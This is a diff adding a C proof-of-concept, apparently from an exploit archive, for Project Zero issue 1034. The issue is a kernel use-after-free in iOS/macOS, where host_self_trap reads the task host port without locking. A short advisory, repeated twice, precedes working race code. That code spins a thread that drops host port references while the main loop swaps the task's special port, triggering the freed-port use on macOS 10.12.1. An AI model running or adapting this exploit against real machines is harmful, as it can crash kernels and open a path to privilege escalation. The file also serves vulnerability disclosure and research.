@@ -1,0 +1,103 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1034
+
+The task struct has a lock (itk_lock_data, taken via the itk_lock macros) which is supposed to
+protect the task->itk_* ports.
+
+The host_self_trap mach trap accesses task->itk_host without taking this lock leading to a use-after-free
+given the following interleaving of execution:
+
+Thread A: host_self_trap:
+  read current_task()->itk_host         // Thread A reads itk_host
+
+Thread B: task_set_special_port:
+  *whichp = port;                       // Thread B replaces itk_host with eg MACH_PORT_NULL
+  itk_unlock(task);
+  
+  if (IP_VALID(old))
+    ipc_port_release_send(old);         // Thread B drops last ref on itk_host
+
+Thread A: host_self_trap:
+  passes the port to ipc_port_copy_send // uses the free'd port
+
+host_self_trap should use one of the canonical accessors for the task's host port, not just directly read it.
+
+PoC tested on MacOS 10.12.1
+*/
+
+// ianbeer
+#if 0
+iOS/MacOS kernel UaF due to lack of locking in host_self_trap
+
+The task struct has a lock (itk_lock_data, taken via the itk_lock macros) which is supposed to
+protect the task->itk_* ports.
+
+The host_self_trap mach trap accesses task->itk_host without taking this lock leading to a use-after-free
+given the following interleaving of execution:
+
+Thread A: host_self_trap:
+	read current_task()->itk_host         // Thread A reads itk_host
+
+Thread B: task_set_special_port:
+  *whichp = port;                       // Thread B replaces itk_host with eg MACH_PORT_NULL
+  itk_unlock(task);
+  
+  if (IP_VALID(old))
+    ipc_port_release_send(old);         // Thread B drops last ref on itk_host
+
+Thread A: host_self_trap:
+  passes the port to ipc_port_copy_send // uses the free'd port
+
+host_self_trap should use one of the canonical accessors for the task's host port, not just directly read it.
+
+PoC tested on MacOS 10.12.1
+#endif
+
+// example boot-args
+// debug=0x144 -v pmuflags=1 kdp_match_name=en3 -zp -zc gzalloc_min=120 gzalloc_max=200
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <pthread.h>
+
+#include <mach/mach.h>
+#include <mach/host_priv.h>
+
+mach_port_t q() {
+  mach_port_t p = MACH_PORT_NULL;
+  mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p);
+  mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);
+  return p;
+}
+
+int start = 0;
+
+mach_port_t rq = MACH_PORT_NULL;
+void* racer(void* arg) {
+  for(;;) {
+    while(!start){;}
+    usleep(10);
+    mach_port_t p = mach_host_self();
+    mach_port_deallocate(mach_task_self(), p);
+    start = 0;
+  }
+}
+
+int main() {
+  pthread_t thread;
+  pthread_create(&thread, NULL, racer, NULL);
+  for (;;){
+    mach_port_t p = q();
+
+    kern_return_t err = task_set_special_port(mach_task_self(), TASK_HOST_PORT, p);
+
+    mach_port_deallocate(mach_task_self(), p);
+    mach_port_destroy(mach_task_self(), p);
+    // kernel holds the only ref
+
+    start = 1;
+
+    task_set_special_port(mach_host_self(), TASK_HOST_PORT, MACH_PORT_NULL);
+  }
+  return 0;
+}
